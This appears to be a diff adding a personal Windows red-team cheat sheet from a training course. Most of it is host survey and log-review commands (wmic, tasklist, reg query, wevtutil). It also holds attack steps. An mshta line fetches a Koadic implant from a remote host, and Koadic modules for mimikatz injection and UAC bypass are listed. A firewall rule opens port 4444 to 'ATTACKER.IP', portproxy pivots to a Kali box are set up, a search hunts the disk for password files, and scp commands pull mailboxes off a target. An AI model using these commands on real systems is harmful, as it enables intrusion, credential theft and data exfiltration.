@@ -1,0 +1,755 @@
+=======================================================================================
+                                    KEK
+=======================================================================================
+-------------------------sysinfo------------------------------
+# Add date to burn list
+date /t && time /t
+wmic os get lastbootuptime,localdatetime,currenttimezone 
+
+# Check if user is logged on
+tasklist /FI "IMAGENAME eq explor*" /FO list /V
+tasklist /FI "USERNAME eq Administrator" /FO list /V
+tasklist /FI "USERNAME ne student*" /FO list /V
+tasklist /V /FI "USERNAME ne SYSTEM" /FI "USERNAME ne LOCAL SERVICE" /FI "USERNAME ne NETWORK SERVICE"
+
+
+# OS and Networking
+wmic os get csdversion,csname,version
+ipconfig /all
+
++[User, Domain and Perms]
+>   whoami /all
+>   wmic computersystem get Name, domain, Manufacturer, Model, Username, Roles /format:list
+
+---------------------------cron-------------------------------
+wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe
+
+# Check auto run schedule tasks 
+at
+schtasks /query /v /fo list | more
+
+# Check start ups
+reg query hklm\software\microsoft\windows\currentversion\run && reg query hklm\software\microsoft\windows\currentversion\runonce
+reg query hklm\software && reg query hklm\software\wow6432node
+reg query hku
+reg query HKEY_USERS\S-1-5-21-2598922483-3761654869-3445751098-500\software
+wmic startup list full /format: list
+net start
+
+---------------------------logs--------------------------------
+netsh advfirewall show allprofiles
+auditpol /get /category:*
+
+# Used to run the script
+dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d
+dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d /b
+
+# Run script here
+wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
+-----------------------------DIR---------------------------------
+net share
+dir /o:d /t:w /a c:\
+dir /o:d /t:w /a /s c:\windows\temp
+dir /o:d /t:w /a c:\windows\
+dir /o:d /t:w /a c:\windows\system32
+dir /o:d /t:w /a c:\programdata
+dir /o:d /t:w /a c:\progra~1
+dir /o:d /t:w /a c:\progra~2
+dir /o:d /t:w /a C:\Users\{your user name}\AppData\Local\Programs
+
+-----------------------------Binary---------------------------------
+tasklist /V /FI "USERNAME ne student*" | more
+wmic PROCESS WHERE "NOT ExecutablePath LIKE '%Windows%'" GET ExecutablePath,processid,ParentProcessId
+wmic process get CommandLine,Description,ExecutablePath,Handle,HandleCount,Name,ParentProcessId,ProcessId /format:list | more
+
+netstat /anob
+
+
+
++[Find DLLs in processes]
+>   tasklist /M [dll]* /FO list
+
++[Find SERVICE in process]
+>   tasklist /SVC /FI "SERVICES eq Uso*"
+
++[Process list]
+>   wmic process get CommandLine,Description,ExecutablePath,Handle,HandleCount,Name,ParentProcessId,ProcessId /format:list | more
+
+> wmic process where "NOT ExecutablePath LIKE 'OpenSSH'" get CommandLine,Description,ExecutablePath,Handle,HandleCount,Name,ParentProcessId,ProcessId /format:list | more
+
++[List processes with without system32]
+>   wmic PROCESS WHERE "NOT ExecutablePath LIKE '%Windows%'" GET ExecutablePath,processid,ParentProcessId
+
++[Prosecute process]
+>   wmic PROCESS where "ProcessId='3584'" list full
+
++[Get all processes with a PID]
+>   for /f "tokens= 5 delims= "" " %i in ('netstat -anop tcp ^|findstr /r ^[0-9]')do @wmic PROCESS where "ProcessId='%i'" get CommandLine,Description,ExecutablePath,ParentProcessId,ProcessId /format:list
+
++[Sockets]
+>   netstat -anob
+
+
+
+////////// SERVICES //////////
++[Prosecute service]
+>   reg query hklm\system\currentcontrolset\services\[service]
+
++[Services]
+tasklist /svc
+sc queryex lanmanserver             # Get pid
+sc getdisplayname lanmanserver      # get display name
+sc getkeyname server                # get key name
+sc qc lanmanserserver               # get execution path and dependancy 
+sc qdescription lanmanserver        # Will get the legit description
+////////// SERVICES //////////
+
+
+--------------------------------burn---------------------------------------
+wmic os get lastbootuptime,localdatetime,currenttimezone 
+dir /o:d /t:w c:\windows\temp
+netstat /anob
+tasklist /V | more
+tasklist /FI "USERNAME ne student*" /FO list /V | more
+
+# User the script!
+dir /o:d /t:w c:\windows\system32\winevt\logs
+
+# Used to run the script
+dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d
+dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d /b
+Wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
+
+=======================================================================================
+                                    KEK
+=======================================================================================
+ssh -S /tmp/T5 student7@127.0.0.1 -p 50500 "where /T /R c:\progra~2\hMailServer\Data\Workgroup *eml" > emailSizes
+
+ssh -S /tmp/T5 student7@127.0.0.1 -p 50500 "for /F \"tokens=*\" %f in ('where /F /R c:\progra~2\hMailServer\Data\Workgroup *eml') do @echo %f" 
+ 
+ssh -S /tmp/T5 student7@127.0.0.1 -p 50500 "for /F %f in ('where /F /R c:\progra~2\hMailServer\Data\Workgroup *eml') do @certutil -hashfile %f" > emailHashesRemote.txt
+
+## Download files
+scp -T -o "ControlPath=/tmp/T5" -P 50500 -r student7@127.0.0.1:'"c:/progra~2/hMailServer/Data/Workgroup"' .
+
+## Compare hashes
+find . -name \*eml -exec sha1sum {} \; > emailHashesLocal.txt
+
+
+=======================================================================================
+                                    SURVEY
+=======================================================================================
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "systeminfo" > systeminfo.out
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "net user" > netuser.out
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "net localgroup" > netlocalgroup.out
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "net session" > netsession.out
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "net start" > netstart.out
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "type %systemroot%\system32\drivers\etc\hosts" > etc_hosts.out
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "arp -a" > arp.out
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "route print" > route.out
+
+=======================================================================================
+                                    FIND TRICKS
+=======================================================================================
+# Find files with the word cred and with the extention txt with the word password in them
+where /R C:\ *pass* *cred* *vnc* *.config* | findstr /i "\.ini \.txt \.xml" | findstr /P /M /I /F:/ "password" 2>nul
+
+# Find a binary
+where /R C:\ *Stub.exe*
+
+# Find file with file size and last modified
+where /R C:\ SFK.exe /T 
+
+# Search specific locations
+where "c:\windows;c:\windows\system32:*.dll"
+
+# Find all files with their size
+where /T /R c:\progra~2\hMailServer\Data\Workgroup *eml
+
+=======================================================================================
+                                    SSH TRICKS
+=======================================================================================
+# Running commands and save output locally 
+ssh -S /tmp/T7 student7@127.0.0.1 -p 50700 "systeminfo" > systeminfo.out
+
+# copy a file from target even a directory
+scp -T -o ControlPath=<control socket> -P <port> -r <user>@127.0.0.1:'"C:/directory/to/be/collected"' . (Add the -r and the path to a dir and you can scp the whole directory)
+
+# Hash all files in a directory
+ssh -S /tmp/T5 student7@127.0.0.1 -p 50500 "for %f in (C:\progra~2\hMailServer\Data\Workgroup\VP\*) do certutil -hashfile %f" > VP_hashes
+
+# Download all the files from the directory
+scp -T -o "ControlPath=/tmp/T5" -P 50500 -r student@127.0.0.1:'"c:/progra~2/hMailServer/Data/Workgroup/VP"' .
+
+=======================================================================================
+                                    Windows Registry 
+=======================================================================================
++[Installed programs]
+reg query hklm\software
+reg query hklm\software\microsoft\windows\currentversion\uninstall
+
++[Auto Run]
+reg query hklm\software\microsoft\windows\currentversion\run
+reg query hklm\software\microsoft\windows\currentversion\runonce
+
+=======================================================================================
+                                    DOWNLOAD FILES HASH Random LOOPS
+=======================================================================================
+http://blog.commandlinekungfu.com/2010/01/episode-76-say-hello-to-my-little.html
+
+# Hash all files in a directory and sub directories
+for /R C:\Users\Administrator\Desktop %f in (*) do @certutil -hashfile %f
+
+# Hash all files in a directory
+ssh -S /tmp/T5 student7@127.0.0.1 -p 50500 "for %f in (C:\progra~2\hMailServer\Data\Workgroup\VP\*) do certutil -hashfile %f" > VP_hashes
+
+# Download all the files from the directory
+scp -T -o "ControlPath=/tmp/T5" -P 50500 -r student@127.0.0.1:'"c:/progra~2/hMailServer/Data/Workgroup/VP"' .
+
+# Loop hash
+for %f in (C:\progra~2\hMailServer\Data\Workgroup\VP\*) do certutil -hashfile %f
+
+
+# For loop example
+for /L %i in (1,0,2) do @for /f "tokens=5" %j in ('netstat -nao ^| find ^":47145^"') do @echo %j
+for /f "tokens= 5 delims= "" " %i in ('netstat -anop tcp ^|findstr /r ^[0-9]')do @ tasklist /fi "PID eq %i" /v
+
+# Find all sockets in tasklist 
+for /f "tokens= 5 delims= "" " %i in ('netstat -anop tcp ^|findstr /r ^[0-9]')do @wmic PROCESS where "ProcessId='%i'" get CommandLine,Description,ExecutablePa
+th,Name,ParentProcessId,ProcessId /format:list
+
+
+for /f "tokens=2,3,4,5 delims= "" " %i in ('netstat -anop tcp ^|findstr /r ^[0-9]')do @echo SOCK= %i %j %k %l && @wmic PROCESS where "ProcessId='%l'" get CommandLine,Description,ExecutablePath,Name,ParentProcessId,ProcessId /format:list
+
+
+# Find all short hands in current dir
+for %i in (.) do @echo %~si 
+
+# Hash all files with for loop
+for /F "tokens=1" %f in ('where /F /R c:\users\administrator\desktop *eml') do @certutil -hashfile %f
+
+# Hash all file sin a for loop
+for /R C:\Users\Administrator\Desktop %f in (*) do @certutil -hashfile %f
+
+=======================================================================================
+                                    Windows Firewall 
+=======================================================================================
+netsh advfirewall show allprofiles
+netsh advfirewall monitor show firewall
+netsh advfirewall monitor show currentprofile 
+
+netsh interface porproxy add v4tov4 listenAddress=0.0.0.0 listenport=33890 connectaddress=127.0.0.1 connectport=3389
+netsh interface protproxy show all
+
+TURN ON PORT FORWARDING (not needed?)
+netsh interface ipv4 show interfaces
+netsh interface ipv4 show interface <Idx #>
+netsh interface ipv4 set interface <Idx #> forwarding="enabled"
+netsh interface ipv4 set interface <Idx #> forwarding="disabled"
+
+
+PUNCTURE FIREWALL (not needed?)
+netsh advfirewall firewall add rule name="HAX" dir=in protocol=tcp localport=4444 remoteip=ATTACKER.IP profile=public action=allow
+netsh advfirewall firewall delete rule name="HAX"
+
+
+REDIRECTION
+netsh interface portproxy show v4tov4
+netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=443 connectaddress=TARGET.IP
+netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0
+
+
+
+EXAMPLE 
+MAC --> Windows --> Kali
+192.168.1.63 --> 192.168.1.104 --> 192.168.179.134
+
+netsh interface portproxy show v4tov4
+netsh interface portproxy add v4tov4 listenAddress=0.0.0.0 listenport=35222 connectAddress=192.168.179.134 connectport=2222
+netsh interface ipv4 show interfaces
+netsh interface ipv4 show interfaces level=verbose
+netsh advfirewall firewall add rule name="Tunnel Network" dir=in protocol=tcp localport=35222 profile=public action=allow
+netsh advfirewall firewall delete rule "Tunnel Network"
+
+
+
+ps /nop /c "schtasks /query /FO csv | convertfrom=csv | where }$_.status -eq 'Running'}"
+
+==============================================================================================================================
+                                    Koadic
+==============================================================================================================================
+# Command list https://github.com/zerosum0x0/koadic/wiki/Commands
+# Run this in the terminal obvi change ip and port
+mshta http://192.168.179.134:8888/test.hta
+
+# Main tool is sta/js/mshta
++[info]
+    [SRVHOST]       Where zombies will connect to
+    [SRVPORT]       Port zombies will connect to
+    [EXPIRES]       Tell zombies when to die
+    [KEYPATH]       TLS
+    [CERPATH]       TLS
+    [MODULE]        Define what implant to run when the zombie connects
+    [ENDPOINT]      sta/js/mshta file extention
+
++[listeners]
+    listeners
+    # list all the listeners that kaodic has running 
+    listeners #
+    listeners -k #
+
++[Info on zombie]
+    zombies #
+
++[Domain Gather]
+    use implant/gather/enum_domain_info
+    # Gives domain controllers
+    # Can unlock other domain tools
+
++[elevate]
+    use implant/inject/mimikatz_dotnet2js
+    use implant/elevate/bypassuac_eventvwr
+
++[Credential Store]
+    creds
+    creds -a
+
++[Commands]
+    use implant/manage/exec_cmd 
+
+==============================================================================================================================
+                                                    WMIC
+==============================================================================================================================
++[Networking]
+>>  ipconfig /all
+>   wmic NICCONFIG get DefaultIPGateway,Description,DHCPLeaseExpires,DHCPServer,IPAddress,  MACAddress,ServiceName,IPPortSecurityEnabled /format: list
+
++[OS Version]
+>   wmic os get csdversion,csname,version
+
++[Check environment]
+>   wmic environment get Description,VariableValue
+
++[Powershell and wmic logging?]
+>   wevtutil gl "windows powershell"
+>   reg query hklm\software\microsoft\powershell\ /s
+>   reg query hklm\software\policies\microsoft\windows\   # If powershell is missing no scriptblock
+>   reg query hklm\software\microsoft\wbem\cimom /v logging
+
+--------------------------------------[+] health[+]--------------------------------------
++[Total Ram, CPU ARCH, Domain, Roles, Workgroup]
+>   wmic computersystem get Domain,Model,Manufacturer,numberofprocessors,partofdomain,roles,systemtype,totalphysicalmemory,workgroup /format: list
+
++[CPU load]
+wmic cpu get addresswidth,caption,currentclockspeed,deviceid,loadpercentage /format: list
+
++[Ram load]
+for /f "tokens=2 delims==" %A in ('wmic computersystem get totalphysicalmemory /format:value') do @(for /f "tokens=2 delims==" %B in ('wmic os get freephysicalmemory /format: value') do @(echo  Total %A && echo Free: %B)) 
+
+--------------------------------------[+] cron[+]--------------------------------------
++[Registry]
+>>  reg query hklm\software\microsoft\windows\currentversion\run
+>>  reg query hklm\software\microsoft\windows\currentversion\runonce
+>>  reg query hklm\software
+
++[Start ups]
+>>  at
+>>  schtasks /query /v 
+>>  wmic job
+
+
++[Current registry startup]
+>   wmic startup list full /format: list
+
++[query schtasks]
+>   schtasks
+>   schtasks /query /tn "\Microsoft\Windows Defender\MP Scheduled Scan" /v /fo list
+
+
+
+====SERVICES====
++[Services]
+>   wmic service where "State='Running'" get name,ProcessId,InstallDate,PathName,StartMode,Caption /format: list
+>   wmic service where "State='Running'" get name,ProcessId,InstallDate,PathName,StartMode,Caption /format: list | less
+
++[Check services above]
+    wmic service where "name='WinDefende'" list full
+
++[Location of DLL]
+    reg query hklm\system\currentcontrolset\services\[service]
+
+====PSP====
++[PSP installed?]
+>   wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe
+--------------------------------------[+] logs[+]--------------------------------------
++[Audit Pol]
+>>  auditpol /get /category:*
+
++[Firewall]
+>> netsh advfirewall show allprofiles
+
+
++[Win Log Script]
+>   dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d
+>   dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d /b
+
++[Manual Check]
+>   wevtutil qe System "/q:*[System[TimeCreated[@SystemTime>='2013-01-30T00:00:00' and @SystemTime<='2013-01-31T00:00:00']]]"
+
+>   wevtutil qe Security /q:"Event[System[(EventID=4624) or (EventID=4648)]]" /rd:True /f:text /c:5
+>   wevtutil qe Microsot-Windows_terminalServices-RemoteConnectionManager/Operational /c:10/f:text
+
+-----------------------------------[+]binary[+]--------------------------------------
++[Process list]
+>> tasklist /V /FO list | more
+tasklist /FI "USERNAME ne Administr*" /V 
+
++[Netstat]
+>>  netstat /anob
+
++[Process list]
+>   wmic process get CommandLine,Description,ExecutablePath,Handle,HandleCount,Name,ParentProcessId,ProcessId /format:list | more
+
++[List processes with without system32]
+>   wmic PROCESS WHERE "NOT ExecutablePath LIKE '%Windows%'" GET ExecutablePath,processid
+
++[Prosecute process]
+>   wmic PROCESS where "ProcessId='3020'" list full
+
++[Sockets]
+>   netstat -anob
+
++[Prosecute service]
+>   reg query hklm\system\currentcontrolset\services\[service]
+
++[Hash item]
+>   certutil -hashfile c:\windows\system32\wpnservice.dll
+
+
+-----------------------------------[+]directory[+]--------------------------------------
++[Net shares]
+>>  net share
+
++[Directories]
+>>  dir /o:d /t:w c:\
+>>  dir /o:d /t:w c:\windows\temp
+>>  dir /o:d /t:w c:\windows\
+>>  dir /o:d /t:w c:\windows\system32
+>>  dir /o:d /t:w c:\windows\system32\winevt\logs
+>>  wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
+
+
+-----------------------------------[+] burn [+]-----------------------------------------
+>>  dir /o:d /t:w c:\windows\temp
+>>  dir /o:d /t:w c:\windows\system32\winevt\logs
+>>  dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d
+>>  dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d /b
+>>  Wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
+>>  netstat /anob
+>>  tasklist
+
+-----------------------------------[+] misc [+]-----------------------------------------
+
+### Situational
++[Users on the box]
+>   wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status
+>   wmic netlogin list full
+>   wmic useraccount list full
+
++[VM, UUID]
+>   wmic csproduct list full
+
++[Drivers with filepath, status, and name]
+>   wmic sysdriver get Caption,Name,PathName,ServiceType,State,Status /format:list
+
++[File Signature]
+get-authenticodesignature -filepath "C:\Tools\netcat.zip"
+
+
++[Searching for shit]
+where /R C:\ *pass* *cred* *vnc* *.config* | findstr /i "\.ini \.txt \.xml" | findstr /P /M /I /F:/ "password" 2>nul
+
+=======================================================================================
+                                    Windows Registry 
+=======================================================================================
++[Installed programs]
+reg query hklm\software
+reg query hklm\software\microsoft\windows\currentversion\uninstall
+
++[Auto Run]
+reg query hklm\software\microsoft\windows\currentversion\run
+reg query hklm\software\microsoft\windows\currentversion\runonce
+
+
+
+
+=======================================================================================
+                                    Windows Registry 
+=======================================================================================
++[Installed programs]
+reg query hklm\software
+reg query hklm\software\microsoft\windows\currentversion\uninstall
+
++[Auto Run]
+reg query hklm\software\microsoft\windows\currentversion\run
+reg query hklm\software\microsoft\windows\currentversion\runonce
+
+
+
+
+=======================================================================================
+                                    Windows CMD 
+=======================================================================================
+
+-------------------------------------[+] sysinfo[+]-------------------------------------
++[Time and Date]
+echo %DATE%-%TIME%
+
++[User you are]
+whoami
+whoami /all
+
++[Networking]
+ipconfig /all
+
+--------------------------------------[+] health[+]--------------------------------------
+--------------------------------------[+] cron[+]--------------------------------------
+--------------------------------------[+] logs[+]--------------------------------------
++[Check for log changes]
+dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d
+Copy them
+dir c:\Windows\System32\winevt\Logs /o:d /t:w /a:-d /b
+
++[Logs by datetime]
+wevtutil qe System "/q:*[System[TimeCreated[@SystemTime>='2013-01-30T00:00:00' and @SystemTime<='2013-01-31T00:00:00']]]"
+
+wevtutil qe Security "/q:*[System[TimeCreated[@SystemTime<'2019-05-13T00:00:00']]]" /f:text
+
++[Firewall logs]
+wevtutil qe "Microsoft-Windows-Windows FIrewall with Advanced Security/FIrewall" /q:"*[System[TimeCreated[@SystemTime>'2019-05-14T00:00:00']]]" /f:text
+
+wevtutil qe Security /q:"Event[System[(EventID=4624)]]" /rd:True /format:text /c:1
+wevtutil qe Security /q:"Event[System[(EventID=4624) or (EventID=4648)]]" /rd:True /f:text /c:5
+wevtutil qe Microsot-Windows_terminalServices-RemoteConnectionManager/Operational /c:10/f:text
+
+-----------------------------------[+]binary[+]--------------------------------------
+tasklist | sort /r /+65
+
+
++[Services]
+tasklist /svc
+sc queryex lanmanserver             # Get pid
+sc getdisplayname lanmanserver      # get display name
+sc getkeyname server                # get key name
+sc qc lanmanserserver               # get execution path and dependancy 
+sc qdescription lanmanserver        # Will get the legit description
+
++[Check service location] 
+reg query hklm\system\currentcontrolset\services\[service]
+-----------------------------------[+]directory [+]--------------------------------------
+
+C:\Windows\Tasks
+c:\Windows\prefetch
+
+reg query hklm\software
+
+dir C:\users\administrator\appdata\roaming\microsoft\windows\recent
+-----------------------------------[+] misc [+]-----------------------------------------
+
+
+
+=======================================================================================
+                                    Windows PowerShell 
+=======================================================================================
+
+-------------------------------------[+] sysinfo[+]-------------------------------------
++[Time and Date]
+get-date 
+
++[User you are]
+whoami
+whoami /all
+
+
+
+--------------------------------------[+] health[+]--------------------------------------
++[Ram]
+(Get-WMIObject Win32_PhysicalMemory |  Measure-Object Capacity -Sum).sum
+(Get-WMIObject Win32_PhysicalMemory |  Measure-Object Capacity -Sum).sum/1GB
+--------------------------------------[+] cron[+]--------------------------------------
+--------------------------------------[+] logs[+]--------------------------------------
+-----------------------------------[+]binary[+]--------------------------------------
+get-process | Select-Object  path
+get-filehash "File"
+
+
++[Get a hash]
+get-filehash  (get-process -id 6852 | select-object Path).Path
+
+-----------------------------------[+]directory [+]--------------------------------------
+-----------------------------------[+] misc [+]-----------------------------------------
+
+
+=======================================================================================
+                                    Windows Wimic 
+=======================================================================================
+wmic os list /?
+wmic process list /?
+wmic os get /?
+
++[Wmic logging?]
+reg query hklm\software\microsoft\wbem\cimom /v logging
+    0 = No Logging
+    1 = Errors Only
+    2 = Verbose Logging (Default)
+
++[Wmic log location]
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM\CIMOM\ /v "Logging Directory"
+-------------------------------------[+] sysinfo[+]-------------------------------------
++[Time and Date]
+wmic os get lastbootuptime,localdatetime,currenttimezone   # minute difference between zulu
+wmic os get localdatetime
+WMIC Path Win32_LocalTime Get Day,Hour,Minute,Month,Second,Year  
+
++[User you are]
+whoami /all
+wmic computersystem get username
+wmic netlogin list full
+wmic useraccount list full
+
++[OS Version]
+wmic os get csdversion,csname,version
+
++[Networking Info]
+wmic NICCONFIG get DefaultIPGateway,Description,DHCPLeaseExpires,DHCPServer,IPAddress,MACAddress,ServiceName,IPPortSecurityEnabled /format: list
+ifconfig /all
+
++[User and netbios info]
+wmic computersystem get Name, domain, Manufacturer, Model, Username, Roles /format:list
+
++[SIDs]
+wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status
+
+[VMWare info + UUID]
+wmic csproduct list full
+
++[Environment]
+wmic environment get Description,VariableValue
+
+
++[Device drivers]
+wmic sysdriver get Caption,Name,PathName,ServiceType,State,Status /format:list
+--------------------------------------[+] health[+]--------------------------------------
+
++[Ram amount]
+wmic ComputerSystem get TotalPhysicalMemory
+
++[Processor count]
+wmic computersystem get NumberOfProcessors
+
++[Get CPU info]
+wmic cpu get addresswidth,caption,currentclockspeed,deviceid
+
++[Hard drive space]
+wmic logicaldisk where drivetype=3 get Name,Compressed,Description,FileSystem,FreeSpace,SupportsDiskQuotas,VolumeDirty,VolumeName /format: list
+
+--------------------------------------[+] cron[+]--------------------------------------
++[Get auto starts]
+wmic startup list full
+
++[Get jobs]
+wmic job
+
++[Services]
+wmic service where "State='Running'" get name,ProcessId,InstallDate,PathName,StartMode,Caption /format: list | less
+
++[Check services above]
+wmic service where "name='WinDefende'" list full
+
++[Location of DLL]
+reg query hklm\system\currentcontrolset\services\[service]
+--------------------------------------[+] logs[+]--------------------------------------
++[PSP installed?]
+wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe
+
+wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe
+
+
+
+-----------------------------------[+]binary[+]--------------------------------------
++[Get info of a file]
+wmic datafile where name='c:\\sfk.exe' list full
+
++[File hash]
+CertUtil -hashfile C:\TEMP\MyDataFile.img SHA1
+
++[Process list]
+wmic process get CommandLine,Description,ExecutablePath,Handle,HandleCount,Name,ParentProcessId,ProcessId /format:list
+
+wmic process get name,processid,commandline /format: line
+
++[Get per process like a parent]
+wmic PROCESS where "ProcessId='3020'" list full
+
+
++[List process not running off system]
+wmic PROCESS WHERE "NOT ExecutablePath LIKE '%Windows%'" GET ExecutablePath
+
+-----------------------------------[+]directory [+]--------------------------------------
+-----------------------------------[+] misc [+]-----------------------------------------
++[Hot patches]
+qmic qfe list full /format: list
+
++[RDP permissions]
+wmic  RDACCOUNT list full
+
+
+
+
+==========================================================================================
+                            Rando
+==========================================================================================
+[event log]
+#4624 successful logon
+wevtutil qe Security /q:"Event[System[(EventID=4624)]]" /rd:True /format:text /c:1
+wevtutil qe Security /q:"Event[System[(EventID=4624) or (EventID=4648)]]" /rd:True /f:text /c:5
+wevtutil qe Microsot-Windows_terminalServices-RemoteConnectionManager/Operational /c:10/f:text
+get-eventlog "Security" | where-object {$_.EventId -eq 4624}
+
+
+[initial]
+wmic process get name,processid,handlecount,commandline
+wmic process list brief
+wmic process where "Name='svchost.exe'" list brief
+wmic process where "Name='svchost.exe'" get name,commandline  
+wmic process get commandline,processid /format: list
+
+wmic service where "name='LanManServer'" list full
+sc query 
+
+wmic netlogin list brief
+wmic volumne list brief
+wmic nic list full
+wmic timezone list brief
+wmic sysaccount list full
+wmic rdaaccount list full
+wmic service where "ProccessId='pid'" list brief full
+systeminfo 
+    Hostname
+    Install data
+    processor
+    logon server
+    systemboot time
+
+
+[Recursive dir]
+dir /s/b *.txt
+dir /s /b "C:\*.txt
+
+[Services]
+    wmic service where "State='Running'" list brief
+    wmic service where "State='Running'" get name,processid,installdate,pathname,startmode,caption
+
+[Requstry query]
+    reg query hklm\software
+    reg query hklm\software\Microsoft\Windows\CurrenteV ersion\Uninstall
